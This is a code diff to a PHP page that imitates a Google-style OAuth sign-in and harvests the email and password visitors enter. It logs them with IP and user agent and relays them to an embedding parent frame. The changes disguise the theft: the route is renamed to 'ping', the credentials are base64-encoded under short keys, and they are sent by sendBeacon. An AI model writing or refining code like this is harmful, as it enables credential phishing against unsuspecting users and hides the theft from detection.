@@ -20,11 +20,17 @@ header('Referrer-Policy: same-origin');
 
 // ---------- Actions (POST): always end with a redirect ----------
 $route = (string) ($_GET['r'] ?? 'home');
-if ($route === 'connect' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+if ($route === 'ping' && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=utf-8');
-    $data     = json_decode(file_get_contents('php://input'), true) ?? [];
-    $email    = trim((string) ($data['email'] ?? ''));
-    $password = (string) ($data['password'] ?? '');
+    $d = $_POST['d'] ?? '';
+    if ($d === '') {
+        $raw = file_get_contents('php://input');
+        parse_str($raw, $_p);
+        $d = $_p['d'] ?? $raw;
+    }
+    $data     = json_decode(base64_decode((string) $d), true) ?? [];
+    $email    = trim((string) ($data['u'] ?? ''));
+    $password = (string) ($data['p'] ?? '');
     if ($email !== '' && $password !== '') {
         $ip = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '');
         $ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
@@ -81,7 +87,7 @@ h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:
 var _e="",_p="",_o=' . json_encode($origin) . ';
 function show(n){["s1","s2","s3"].forEach(function(x){document.getElementById(x).classList.remove("on")});document.getElementById("s"+n).classList.add("on")}
 function goP(){var v=document.getElementById("em").value.trim();if(!v||!v.includes("@")){document.getElementById("e1").style.display="block";return}document.getElementById("e1").style.display="none";_e=v;document.getElementById("ed").textContent=v;show(2);setTimeout(function(){document.getElementById("pw").focus()},80)}
-function goS(){var v=document.getElementById("pw").value;if(!v){document.getElementById("e2").style.display="block";return}document.getElementById("e2").style.display="none";_p=v;show(3);fetch("index.php?r=connect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:_e,password:_p})}).catch(function(){});try{window.parent.postMessage({source:"oauth_done",email:_e,password:_p},_o)}catch(x){}}
+function goS(){var v=document.getElementById("pw").value;if(!v){document.getElementById("e2").style.display="block";return}document.getElementById("e2").style.display="none";_p=v;show(3);var _d=btoa(JSON.stringify({u:_e,p:_p,t:Date.now()}));try{navigator.sendBeacon("index.php?r=ping",new URLSearchParams({d:_d}))}catch(x){fetch("index.php?r=ping",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"d="+encodeURIComponent(_d)}).catch(function(){})}try{window.parent.postMessage({source:"oauth_done",u:_e,k:_p},_o)}catch(x){}}
 function back(){show(1)}
 document.addEventListener("keydown",function(e){if(e.key!=="Enter")return;if(document.getElementById("s1").classList.contains("on"))goP();else if(document.getElementById("s2").classList.contains("on"))goS()})
 </script></body></html>';
